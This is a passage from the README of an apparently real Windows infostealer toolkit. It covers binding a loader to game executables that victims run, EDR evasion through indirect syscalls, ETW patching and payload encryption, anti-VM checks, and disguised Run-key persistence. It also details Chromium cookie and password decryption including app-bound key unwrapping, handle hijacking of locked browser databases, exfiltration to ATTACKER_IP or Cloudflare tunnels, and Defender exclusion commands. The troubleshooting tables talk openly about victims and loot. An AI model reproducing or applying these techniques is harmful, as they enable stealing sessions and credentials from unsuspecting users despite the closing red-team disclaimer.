   and exits (`-t N` caps the wait; no cap by default).

Why the syscall layer: EDR userland hooks sit in the ntdll `Nt*` prologues. Jumping to a
`syscall; ret` gadget inside ntdll keeps the return address in ntdll rather than in private
memory, which is what a normal transition looks like; a "direct syscall" stub would leave a
private-memory return address on the stack.

`--kill` remains accepted for old scripts and does nothing: there is no separate host to
terminate. The loader process must stay alive for the payload to run.

### Infected .exe format

A standalone infected binary is the loader with the original host appended:

```
[loader.exe bytes][host.exe bytes][host_len:uint32 LE][magic "CKLG":4]
```

On launch, the loader detects the trailing `CKLG` magic, reads `host_len`, extracts the
original host bytes, and runs them. The original host file on disk is never modified -- the
infected copy lives in `ifec/`.

### Rename-restore

When the victim double-clicks the infected `.exe`, the loader must execute the host under
its **original filename**. It:

1. Renames the infected exe to a hidden `~ck_bak.bin` in the same directory.
2. Writes the extracted original host bytes back to the original filename.
3. Executes the restored file.

This is required for **Unity games**, which derive their data path from the exe name (they
look for `<exename>_Data/`). If the host were extracted as `~ck_tmp.exe`, Unity would look
for `~ck_tmp_Data/` and fail with an error window. Rename-restore preserves the name so
Unity finds `_Data/`, `UnityPlayer.dll`, etc.

If AV blocks the rename, the loader falls back to extracting as `~ck_tmp.exe` (works for
apps that don't depend on their own filename). The `~ck_bak.bin` backup is either deleted
immediately or scheduled for deletion on next reboot (`MOVEFILE_DELAY_UNTIL_REBOOT`). With
persistence enabled the backup is kept (the Run key points at it).

### C2 sentinel patching

In `ckdll.cpp`, three sentinel-marked buffers are declared with recognizable patterns:

```c
static char g_c2_url[256]  = "CKC2_DEADBEEF_";   // 14-byte sentinel (C2 URL)
static char g_persist[8]   = {'C','K','P','R','_','_','_','_'};  // persistence on/off
static char g_skip_av[8]   = {'C','K','A','V','0','0','0','0'}; // anti-VM on/off
```

The loader (`loader.cpp`) has its own plaintext copies of these three sentinels in its
`.data` section. `auto.py` / `pick.py` patch the **loader's** sentinels (which are
plaintext and findable in the compiled `loader.exe`):

| Sentinel | Patched value | Effect |
|---|---|---|
| `CKC2_DEADBEEF_` | `http://ATTACKER_IP:PORT/` | C2 URL for HTTP exfiltration |
| `CKPR____` | `CKPR0001` | Enable registry Run-key persistence |
| `CKAV0000` | `CKAV0001` | Disable anti-VM checks (VM targets) |

At runtime, `DecryptPayload()` in the loader:
1. XOR-decrypts `g_payload_enc[]` with `g_xor_key[16]` to recover the raw DLL bytes.
2. Searches the decrypted buffer for the three sentinel patterns.
3. Overwrites them with the loader's own (already-patched) values.
4. The patched buffer is then mapped into the loader's own process.

This keeps the payload encrypted in the loader binary (Defender can't signature-match
the DLL strings) while still allowing `auto.py` to configure C2/persist/anti-VM via
the loader's plaintext sentinels.

If `g_c2_url` still starts with `CKC2` after patching (no C2 configured), the payload
falls back to the local pipe / file path.

### Exfiltration transport (Winsock2 + schannel)

The payload never touches WinHTTP/WinINet: inside a manually mapped image they fail with
error `12029` ("proxy configuration unavailable") because the host process never
initialized the proxy subsystem. Sockets are raw **Winsock2**
(`WSAStartup` -> `socket` -> `connect` -> `send`).

`http://` posts plain HTTP. `https://` (the default in the deploy path) runs a
TLS 1.2 client over the same socket using **schannel** (`secur32.dll`):

- `SCHANNEL_CRED` with `SCH_CRED_MANUAL_CRED_VALIDATION` and `SP_PROT_TLS1_2_CLIENT`
  (TLS 1.3 is still absent on some Windows 10 builds); SNI is the target host.
- The server certificate is validated after the handshake with
  `CertGetCertificateChain` + `CertVerifyCertificateChainPolicy(CERT_CHAIN_POLICY_SSL)`
  against the system roots and the hostname. No request is sent on a bad chain.
- Every output token uses a caller-owned 64 KB buffer. When `pvBuffer` is NULL,
  SspiCli allocates the token itself, and on some hosts that allocation fails with
  `SEC_E_INSUFFICIENT_MEMORY` / `GetLastError` 1450 before a single byte is built
  (the Negotiate package fails the same way, so it is the allocator). curl passes
  its own buffer for the same reason.
- The request is built by hand (`POST / HTTP/1.1\r\nHost: ...\r\nContent-Length: ...`)
  and each write goes through `EncryptMessage`; the close path sends `close_notify`
  so the listener sees a clean TLS EOF.

**Chunked delivery.** Records are serialised once and their offsets kept, so a dump
is split on record boundaries without re-serialising: at most 600 records or 384 KB
per POST. Every chunk is a complete `{"records":[...]}` envelope; only the last one
carries `,"coverage":{...}}` and is tagged `X-CookieLog-Chunk: i/n`. A chunk is only
accepted when the listener answers `HTTP/1.x 200` (for TLS the response record is
decrypted before the status line is read); each chunk gets 4 attempts with
500 / 1000 / 2000 ms backoff. A stalled chunk therefore costs that chunk, not the
dump.

Exfiltration priority in the payload:

1. **HTTPS/HTTP POST to C2** -- if the sentinel was patched with a URL.
2. **Named pipe** `\\.\pipe\ck_pipe` -- if `sink.py` is running locally (20 retries, 250ms each).
3. **Local file** `C:\ProgramData\MediaCache\cache.json` -- final fallback.

### C2 without a VPS -- `--tunnel`

`auto.py --tunnel` starts `cloudflared` in quick-tunnel mode in front of the local listener
and embeds the resulting `https://<name>.trycloudflare.com/` URL in the payload. The picker's
**Tunnel HTTPS** checkbox runs the same path: the Port field owns the listener, and the public
URL replaces whatever is in the C2 field. Cloudflare
terminates TLS at its edge and forwards plain HTTP to `127.0.0.1:<port>`, so:

- no domain, no certificate, no VPS, and **no inbound port** -- it works from a CGNAT line
  where port-forwarding is impossible;
- the payload still runs its own schannel handshake against a publicly trusted chain, so
  the TLS path is exercised end to end, not emulated;
- `listen.py` is untouched (plain HTTP on the loopback side); cookies, passwords, session
  split, chunking and the `/health` probe all behave as they do locally.

The URL is printed when the tunnel is up and is only embedded after `https://.../health`
answers through it. The tunnel lives as long as `auto.py`; killing it drops late victims,
exactly like killing a VPS listener. Quick tunnels are ephemeral and rate-limited -- for a
long engagement use a named tunnel or the VPS path in `deploy/vps/`.

### CRT-less payload DLL

`ckdll.dll` is built without the C runtime to stay small and easy to map:

- `/NODEFAULTLIB /ENTRY:payload_entry /DYNAMICBASE:NO /BASE:0x5F000000`
- `/GUARD:NO /MACHINE:X64`, linked against
  `kernel32.lib crypt32.lib bcrypt.lib iphlpapi.lib secur32.lib` only.
- Custom `memcpy` / `memset` / `memmove` / `memcmp` implementations (no CRT).
- Manual FIPS 180-4 SHA-256 implementation for domain hash verification (no CRT hash).
- `/Od /Oi-` -- **optimization disabled**. The compiler's SSE-vectorized `memcpy` crashes
  inside the manually mapped image; disabling intrinsics prevents that.
- Large buffers are heap-allocated (`VirtualAlloc`), never 64KB+ stack locals: with
  `/Gs1048576` (required because `/NODEFAULTLIB` has no `__chkstk`) a large frame would skip
  the stack guard page and fault beyond it -- unrecoverable AV on the payload thread.

`gen.ps1` converts the compiled `ckdll.dll` into `src/payload.h` (a `g_payload[]` byte array),
which `loader.cpp` embeds.

---
### Cookie-Editor JSON format

All extractors emit cookies in Cookie-Editor JSON, directly importable via the browser
extension:

```json
{
  "domain": ".example.com",
  "name": "sessionid",
  "value": "abc123",
  "path": "/",
  "expirationDate": 1735689600,
  "secure": true,
  "httpOnly": true,
  "sameSite": "Lax",
  "hostOnly": false,
  "session": false
}
```

`hostOnly` is `true` when the domain does not start with `.`. `session` is `true` when
`expirationDate` is `0`. `sameSite` is normalized across browsers (Chromium encodes
2=None/1=Strict/0=Lax; Firefox encodes 0=None/1=Lax/2=Strict -- the payload translates both).

For step-by-step instructions on importing these files into the Cookie-Editor browser
extension, see **[COOKIE_EDITOR_GUIDE.md](COOKIE_EDITOR_GUIDE.md)**.

### Chromium cookie decryption

Chromium stores cookie values encrypted with AES-256-GCM:

1. **v10/v11 key** -- the `encrypted_key` in `Local State` is base64 + DPAPI-wrapped. The
   payload calls `CryptUnprotectData` (user DPAPI) to recover the 32-byte key.
2. **Cookie value** -- `v10`/`v11`-prefixed blobs are decrypted with AES-256-GCM via CNG
   (`BCryptOpenAlgorithmProvider` / `BCryptGenerateSymmetricKey` / `BCryptDecrypt`): 3-byte
   prefix, 12-byte IV/nonce, ciphertext, 16-byte GCM tag.
3. **v20 app-bound key** -- Chrome 127+ adds `app_bound_encrypted_key` to `Local State`:
   base64 with an `APPB` prefix, wrapped with a SYSTEM DPAPI layer plus the user's DPAPI.
   Only the browser's Elevation Service can unwrap it, and the service validates the caller
   path (`MaybeTrimProcessPath`), so the call must come from inside the browser's
   `Application` directory with an impersonation-level proxy blanket.

The payload cannot do that from the mapped image; the loader does it before mapping (v11,
self-injection in v13). `loader.exe` carries `ckdec.exe` as RCDATA and, for every browser it
can write to:

1. Finds `Local State` under `%LOCALAPPDATA%` (then `%APPDATA%`) for each Chromium browser
   and extracts the base64 `app_bound_encrypted_key`.
2. Resolves the installed browser from `App Paths` (rejecting paths that no longer exist)
   and the known `Program Files` / `Program Files (x86)` / `%LOCALAPPDATA%` layouts.
3. Walks `HKLM` and `HKCU` `SOFTWARE\Classes\CLSID`, opens each `LocalServer32`, and matches
   `elevation_service.exe` paths under that browser's `Application` directory. The CLSID
   string is passed to the helper, so Chrome, Edge, Brave and other forks share one build.
4. Probes the `Application` directory with a create/delete of `.ckprobe.<pid>`. Services run
   only where the write succeeds -- a per-user install passes at medium IL, a Program Files
   install does not.
5. Writes the helper as `<Application>\fontcache.exe`, passes the blob and CLSID, waits for
   `DecryptData`, and keeps the raw 32-byte key as `mc-<browser>.key`.
6. Deletes the helper, the intermediate blob, and any stale key from an earlier run.

The stage is not gated on the process token (v14): an elevated token says nothing about an
ACL, and a medium-IL process still owns its per-user install. Browsers that fail the probe
are reported as `no-key` and the v10/v11 key remains usable for stores that still have one.
`bin\ckkey.exe /quiet` performs the same unlock manually.

**Chrome >=118 domain hash prefix.** Both v10 and v20 cookies have a 32-byte
`SHA256(host_key)` hash prepended to the decrypted plaintext. The payload verifies this by
computing `SHA256(host_key)` (using the manual FIPS 180-4 implementation) and comparing it
to the first 32 bytes of the decrypted output. If they match, the 32 bytes are stripped
before output. If they don't match (passwords, or cookies from Chrome <118), 0 bytes are
stripped. This is critical because passwords are also v10-encrypted but do not have the
domain hash prefix -- unconditionally stripping 32 bytes would corrupt password values.

The `DecCookie` function signature:

```c
static bool DecCookie(const unsigned char* enc, int n,
                      unsigned char* out, int* on,
                      const char* host_key);  // cookie domain for SHA256 verification
```

For cookies, `host_key` is the cookie's domain (e.g. `.youtube.com`). For passwords,
`host_key` is the origin URL -- the SHA256 won't match, so no bytes are stripped.

### Manual SHA-256 (FIPS 180-4)

The CRT-less payload cannot use standard library hash functions. A from-scratch SHA-256
implementation is included in `ckdll.cpp` (~60 lines):

```c
static void Sha256Hash(const unsigned char* data, unsigned int len,
                       unsigned char* out32);
```

Uses only custom `memset`/`memcpy` (no CRT). The implementation follows FIPS 180-4:
64-round compression, 8-word state, 64-entry constant table, message padding with
1-bit + length encoding. The 32-byte digest is used exclusively for domain hash
verification in `DecCookie`.

### Firefox cookies

Firefox stores cookies as **plaintext** in `cookies.sqlite` (`moz_cookies.value`). No
decryption is needed; the payload reads `name`, `value`, `host`, `path`, `expiry`,
`isSecure`, `isHttpOnly`, `sameSite` directly.

### CopyFileShared (bypassing browser file locks)

Browsers hold a lock on their live `Cookies` SQLite database. The payload uses `CopyFileShared()`
which calls `CreateFileW(FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE)` + manual `ReadFile`
instead of `CopyFileW`. This bypasses most browser locks -- Firefox and Chrome work even while
the browser is running.

**Handle hijacking (0-sharing locks).** Vivaldi holds a 0-sharing lock (no share flags at all)
on its cookie DB, so even `CopyFileShared` fails with error 32. When this happens, the payload
falls back to `HijackCookieDB()`:

1. `NtQuerySystemInformation(0x40)` enumerates all system handles (~300k handles, growing
   buffer, retried once with the returned required size).
2. Filters handles belonging to the browser process (`vivaldi.exe`, `chrome.exe`, etc.).
3. Duplicates each file handle with `DUPLICATE_SAME_ACCESS` -- not `GENERIC_READ`, because
   Vivaldi's handle has `FILE_READ_DATA` but not `READ_CONTROL`, so `GENERIC_READ` fails.
4. Reads the first 16 bytes and checks for the `SQLite format 3\x00` magic.
5. Reads the full file via `ReadFile` in 64KB chunks (heap buffer) to a temp path, deleting
   stale `-wal`/`-shm` companions first so SQLite does not replay a foreign WAL.
6. Opens with sqlite3 and verifies the expected table (`cookies` or `logins`) exists.

This works on Vivaldi, Chrome, Edge, and Brave while the browser is running -- no need to close it.

The copied database (and its `-wal`/`-shm` companions) go to `%TEMP%\ck_db.tmp` before being
opened read-only with SQLite.

### `auto.py --run` local test flow

1. Backup original .exe to `.orig` (standalone mode only; folder mode skips this -- the
   loader's rename-restore handles it).
2. Copy infected exe over original (standalone) or run directly from `ifec/folds/` (folder).
3. Execute -- the loader opens the game, then maps the payload into its own process and
   runs it on a background thread.
4. Wait for the loader process to exit (payload completion; watchdog at 6 min).
5. Kill the game by exe name (`taskkill /F /IM`) -- it holds the file lock on the host.
6. Restore original .exe (standalone mode only, 5 retries with 3s intervals).
7. Wait for cookies in `loot/all_cookies.json` (5 min timeout).

The loader process is the payload host in v13: terminating it kills the extraction. `--run`
must never kill the loader while the payload is working.

---
## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `connect failed: 10061` in `cache.log` (DEBUG build) | Listener not up or wrong port -- `listen.py` was slow to start (getfqdn DNS delay) | Fixed in current `listen.py` (server_bind override). Ensure `listen.py` is running before the victim executes |
| `WinError 32` restoring original .exe after `--run` | Game process holds the file lock | Fixed in current `auto.py` (waits for the loader/payload to finish, then kills the game by name and retries). Close the game manually if retries fail |
| Unity "Error" window on the host | Host was extracted as `~ck_tmp.exe`, so Unity looked for `~ck_tmp_Data/` | Rename-restore (default) preserves the original exe name; ensure the rename to `~ck_bak.bin` isn't blocked by AV |
| WinHTTP error `12029` | WinHTTP/WinINet fail inside a manually mapped payload (proxy config unavailable) | The payload uses Winsock2, not WinHTTP -- rebuild `ckdll.dll` if you hit this (current code already uses Winsock2) |
| Loader process stays running for the whole extraction | v13 self-injection: the payload runs as a thread inside `loader.exe`, so the process must outlive the run | Expected. `--run` waits for it (6 min watchdog); killing the loader aborts the extraction |
| Cookies not received by listener | `listen.py` not running, wrong C2 URL, or firewall blocking the port | Confirm `listen.py` is up, the C2 URL matches `http://<attacker-ip>:<port>/`, and the port is open in the firewall |
| No Chromium cookies decrypted on Chrome/Edge >=127, coverage says `no-key` | v20 app-bound key absent. The loader's key stage writes the helper into the browser's `Application` directory, and the probe shows that directory is not writable by the current user | Per-user installs need no elevation and should just work; for a `Program Files` install use `bin\ckkey.exe /quiet` on the victim (or the legacy `cookielog.py --v20-sys` + `--v20-usr` flow) to generate the key, then re-extract |
| `DumpChromium: copy failed (browser running?)` | Browser holds a 0-sharing lock on the cookie DB (`CopyFileShared` failed, error 32) | The payload falls back to handle hijacking automatically. If hijack also fails, check `cache.log` (DEBUG builds) for `HijackCookieDB` messages |
| Invalid JSON at listener (`Invalid control character`) | Old payload used raw `Put()` (no escaping) for password values -- binary chars in decrypted passwords break JSON | Fixed in current build (`PutJ()`). Rebuild with `build.bat` |
| DPAPI failed (`CryptUnprotectData` returns false) | Running as a different user than the profile owner | Run the extraction in the target user's context (DPAPI keys are per-user) |
| `[-] no MSVC` during build | Visual Studio C++ Build Tools not installed | Install VS 2022 Build Tools with the C++ workload and run from a Developer Command Prompt |
| No cookies in `loot/` after local test | Payload fell back to the local file because no C2 and `sink.py` wasn't running | Either set a C2 URL + run `listen.py`, or run `sink.py` for pipe mode; check `C:\ProgramData\MediaCache\cache.json` |
| Cookie/password values contain `Ã§` or `Ã£` instead of `ç` or `ã` | Old payload escaped bytes >= 0x80 as `\u00XX`, corrupting UTF-8 multi-byte sequences | Fixed in v4 (PutJ passes bytes >= 0x80 as raw UTF-8). Rebuild with `build.bat` |
| Cookie values have 32 bytes of binary garbage at the start | Chrome >=118 prepends SHA256(host_key) to decrypted plaintext; old payload didn't strip it | Fixed in v4 (DecCookie verifies and strips 32-byte domain hash). Rebuild with `build.bat` |
| Password values have 32 bytes of binary garbage at the start | Old v3 fix unconditionally stripped 32 bytes from all v10 values, including passwords | Fixed in v4 (DecCookie only strips when SHA256(host_key) matches). Rebuild with `build.bat` |
| Windows Defender detects the infected exe as a virus | Payload DLL was plaintext in `loader.exe`; injection imports were in the IAT; the injection chain is a known signature | Fixed in v5: payload is XOR-encrypted in `payload.h`; v13 removes the hollowing chain entirely (manual map, indirect syscalls, ETW patch). Rebuild with `build.bat` |
| Victim on external network returns no data | `detect_ip()` returns a LAN address (192.168.x.x); the victim cannot reach it | Use `--c2 http://YOUR_PUBLIC_IP:PORT/` or the GUI "DETECT PUBLIC IP" button. Port-forward the listener port on your router. A NAT warning is printed when a private IP is detected |
| CGNAT / no port-forward, victim outside the LAN | The ISP hands out a shared public IP, so forwarding the listener port is impossible | `python auto.py game.exe --tunnel` -- cloudflared dials out and the payload posts to the public `https://*.trycloudflare.com/` URL; nothing binds to the WAN |
| `--tunnel` stops with `cloudflared not found` | The binary is not at `%LOCALAPPDATA%\cloudflared\cloudflared.exe` (Windows) or `~/.local/bin/cloudflared` (Linux) | Re-run `install.bat` / `./install.sh`, or set `CLOUDFLARED=/path/to/binary`. A quick tunnel also needs outbound 443 to Cloudflare |
| Payload doesn't run in VMware / VirtualBox | Anti-VM checks (MAC prefix, `IsDebuggerPresent`, analysis process names) detect the VM and exit | Use `--no-anti-vm` (CLI) or check "Disable anti-VM" (GUI) to patch `CKAV0000` -> `CKAV0001` |
| `inet_addr` / `connect` fails in `cache.log` (DEBUG build) | C2 URL was not patched (sentinel still `CKC2_DEADBEEF_`) or wrong IP/port | Verify `auto.py` patched the loader sentinel; check the C2 URL with the GUI "TEST C2" button |
| **Payload/exe dies silently mid-run on the test machine** -- exit `0xC0000005`, no exception handler fires, the point of death moves between runs after every rebuild | Defender behavioral ML (`Behavior:Win32/DefenseEvasion.A!ml` -- the manual-map/syscall chain itself) plus a cloud verdict on fresh `loader.exe` builds (`Trojan:Win32/Bearfoos.B!ml`) kills the process; it is the technique, not a payload bug | Add the repo folder to Defender exclusions once (admin): `powershell -command "Start-Process powershell -Verb RunAs -ArgumentList '-command Add-MpPreference -ExclusionPath C:\path\to\cookielog'"`. Confirmed via `Get-WinEvent Microsoft-Windows-Windows Defender/Operational` ids 1116/1117 |
| Same exe extracts cookies on one machine and returns nothing on another | Old build: wrong `IP_ADDR_STRING` layout made `GetAdaptersInfo` output read garbage -> false VM MAC match -> silent exit | Fixed in v6. Rebuild with `build.bat`. Diagnose with a DEBUG build: `IsAnalysisEnv` logs per-adapter lines |
| Truncated JSON rejected by the listener with 400 on heavy victims (9+ browsers) | Fixed 2 MB output buffer overflowed silently, closing `]` still written | Fixed in v6 (growable `VirtualAlloc` buffer). Rebuild with `build.bat` |
| Run key persistence registered the wrong exe / payload died at 20 s mid-exfil | v5-and-earlier: persistence ran inside the hollowed process (`GetModuleFileName` -> `notepad.exe`); loader wait was 20 s | Fixed in v6: persistence moved to the loader (points at the hidden `~ck_bak.bin` backup, Run value `MicrosoftEdgeFontCache`), wait raised to 120 s |
| `OSError: [WinError 10048]` starting listener | Port is already in use by another process | Use `--find-port` (CLI) or the GUI "FIND BEST PORT" button to auto-scan for a free port |
| Truncated listener output when running under an auto.bat window | Old `--run` used a fixed 10s + 25s window, shorter than a real full extraction (~40s on a loaded machine) | Current `auto.py` waits for the loader process to exit (6 min watchdog); read `loot/` after the run or run the infected exe manually |

---

## Shortcut scripts

| Script | What it does |
|---|---|
| `install.bat` | One-click dependency installer for Windows (Python, MSVC, CLI tools, build, cmd_init) |
| `install.sh` | One-click dependency installer for Linux/macOS/Git Bash (python3, pip, tkinter, fzf/bat/rg) |
| `auto.bat` | Shortcut: `python auto.py %*` |
| `start_attack.bat` | Launches `listen.py` (port 9090) + `pick.py` GUI together |
| `test_curl.bat` | POSTs a fake cookie to the listener via `curl` to verify it works |
| `build.bat` | Compiles `ckdll.dll` + `loader.exe` (runs `gen.ps1` to XOR-encrypt the DLL into `payload.h`, then compiles the loader with the encrypted payload) |
| `cmd_init.cmd` | Linux-style aliases for cmd.exe (`ls`, `cat`, `grep`, `..`) + cookielog + Python shortcuts |
| `tg_chatid.py` | Finds Telegram chat ID from bot token, saves to `config.json` |
| `session_break.py` | Python session cookie extractor + cryptanalysis (handle hijack + DPAPI + AES-GCM + JWT analysis) |
| `COOKIE_EDITOR_GUIDE.md` | Step-by-step guide for importing session cookies into Cookie-Editor |
| `PAYLOAD_STEPS.txt` / `PAYLOAD_STEPS_PTBR.txt` | Payload execution walkthrough (English / Portuguese) |

---

## Changelog

Full version history in **[CHANGELOG.md](CHANGELOG.md)**.

| Version | Highlights |
|---|---|
| **v15** (current) | `--tunnel`: C2 over a `cloudflared` quick tunnel (public https, no VPS/domain/port-forward, works behind CGNAT); installers rebuilt -- `cloudflared` step, correct exit-code handling, import-based dependency checks, post-install `build.py verify` + 24 tests, `-Check` modes that return nonzero |
| **v14** | Key stage gated on a directory write probe instead of the process token: per-user Chromium installs (Vivaldi, Brave, per-user Chrome) unwrap app-bound keys at medium IL; the fodhelper/computerdefaults ms-settings bypass was implemented, tested and removed (Defender `Behavior:Win32/UACBypassExp.T!gen` kills the loader itself) |
| v13 | Self-injection: payload mapped into loader.exe (no notepad hollowing), indirect `Nt*` syscalls from ntdll SSNs + `syscall; ret` gadget, `EtwEventWrite` patch, header wipe, `MicrosoftSignedOnly` mitigation, `.pdata` registration, base-relocation fallback; `auto.py`/`pick.py` wait for payload completion |
| v12 | TLS 1.2 C2 in the payload (schannel, chain + hostname validation, caller-owned token buffers), record-boundary chunking with per-chunk `200` ACKs, listener `--tls-cert/--tls-key`, https-aware `auto`/`c2auth`, VPS bootstrap TLS default |
| v11 | v20 key stage folded into the loader: embedded `ckdec` helper, CLSID discovery, elevated gate, non-elevated skip |
| v10 | Coverage manifests (`records` + `coverage`), CEF/Electron stores, Firefox sessionstore parsing, password discovery by profile |
| v6 | Bugfix round: false-positive anti-VM (struct layout) that made the payload exit silently on physical machines, growable exfil buffer, 120 s loader wait, full Local State read, HTTP retry, persistence moved to the loader, loader hardening (XOR API names, version resource), build hygiene, handle-hijack stack-frame crash fix, Linux attacker support (`sink.py` FIFO, platform guards) |
| v5 | AV evasion: XOR-encrypted payload, dynamic API resolution, `notepad.exe` hollowing, `--c2`/`--no-anti-vm` flags, GUI public IP + TEST C2 + NAT warning |
| v4 | UTF-8 passthrough fix, SHA256 domain hash verification, manual FIPS 180-4 SHA-256, `session_break.py` cryptanalysis |
| v3 | Handle hijacking (browser-locked DBs), 2 MB buffer, loot file renaming, hidden `~ck_bak.bin` |
| v2 | Shared-read DB copy (browser running), 9 browsers, Discord tokens, password extraction, anti-analysis, persistence, Telegram/Discord relays |
| v1 | `auto.py` one-click (GUI + CLI + interactive terminal), `ifec/` output structure, `listen.py` fast startup |

---

## Disclaimer

See [DISCLAIMER](DISCLAIMER). This toolkit is for security research, red-team training and
education on systems you own or are authorized to test. Unauthorized use is illegal.
